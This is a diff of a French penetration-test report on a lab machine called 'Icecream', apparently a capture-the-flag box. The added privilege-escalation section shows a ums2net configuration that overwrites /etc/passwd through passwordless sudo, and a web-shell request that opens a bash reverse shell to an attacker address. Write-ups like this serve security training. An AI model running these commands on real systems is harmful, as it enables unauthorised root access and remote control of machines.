@@ -1,5 +1,23 @@
   # 📌 Rapport de Vulnérabilité : Icecream
 
+## 📖 Sommaire  
+1. [📝 Introduction](#-1-introduction)  
+2. [🔍 Découverte et Analyse Initiale des Services](#-2-découverte-et-analyse-initiale-des-services)  
+   - [📡 Scan Nmap](#-21-scan-nmap)  
+   - [🛠 Analyse des services ouverts](#-22-analyse-des-services-ouverts)  
+3. [🚀 Potentielles Pistes d'Exploitation](#-3-potentielles-pistes-dexploitation)  
+   - [🔓 Exploitation des Ports SMB](#-31-exploitation-des-ports-smb)  
+4. [🎯 Exploitation et Accès à la Machine](#-4-exploitation-et-accès-à-la-machine)  
+   - [🖥️ Mise en place d'un Web Shell](#-41-mise-en-place-dun-web-shell)  
+5. [⚡ Élévation de Privilèges](#-5-élévation-de-privilèges)  
+   - [📊 Analyse avec Linpeas](#-51-analyse-avec-linpeas)  
+   - [🔑 Utilisation de ums2net pour l'élévation de privilèges](#-52-utilisation-de-ums2net-pour-lélévation-de-privilèges)  
+   - [📌 Exploitation via ums2net](#-53-exploitation-via-ums2net)  
+6. [🛡️ Recommandations de Sécurité](#-6-recommandations-de-sécurité)  
+7. [🔚 Conclusion](#-7-conclusion)  
+
+---
+
 ## 1. Introduction
 
 ### Objectif  
@@ -113,13 +131,37 @@ Tentative d’exploitation de **CVE-2021-3156 (sudo heap overflow)** pour obteni
 
 ![image2](https://github.com/user-attachments/assets/0a7142a3-6757-4040-b7ed-4a8da0eb4025)
 
-### 5.3. Exploitation via ums2net  
-L'exécutable `/usr/sbin/ums2net` est utilisable **sans mot de passe (NOPASSWD)**, ce qui permet de **modifier `/etc/passwd`** et d’ajouter un utilisateur root.
+### 🔑 5.3. Utilisation de ums2net pour l'élévation de privilèges  
+Nous avons créé une **nouvelle configuration** pour `ums2net` qui redirige les entrées/sorties vers `/etc/passwd`.  
 
 ![image3](https://github.com/user-attachments/assets/9dd238a9-4a5f-4786-af8c-5ee2070216fb)
 ![image7](https://github.com/user-attachments/assets/a2ece629-6572-489a-9bb6-a8975d71e1cf)
 ![image23](https://github.com/user-attachments/assets/14e29689-12c6-4b94-ad2a-3f981a7cc3a1)
 
+```bash
+echo '5000 of=/etc/passwd bs=4096' > /tmp/config
+scp /tmp/config user@192.168.188.214:/tmp/
+```
+Sur la machine cible, nous exécutons :  
+
+```bash
+sudo /usr/sbin/ums2net -c /tmp/config -d
+```
+
+**Connexion avec Netcat** pour interagir avec le shell :  
+
+```bash
+nc -lvnp 7777
+curl "http://192.168.188.214:8080/?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/192.168.188.128/7777%200>%261'"
+```
+
+✅ **Accès utilisateur obtenu sur la machine cible !**  
+
+---
+
+### 📌 5.3. Exploitation via ums2net  
+
+Modification de `/etc/passwd` pour ajouter un utilisateur root.  
 
 #### Modification de `/etc/passwd`  
 ```bash
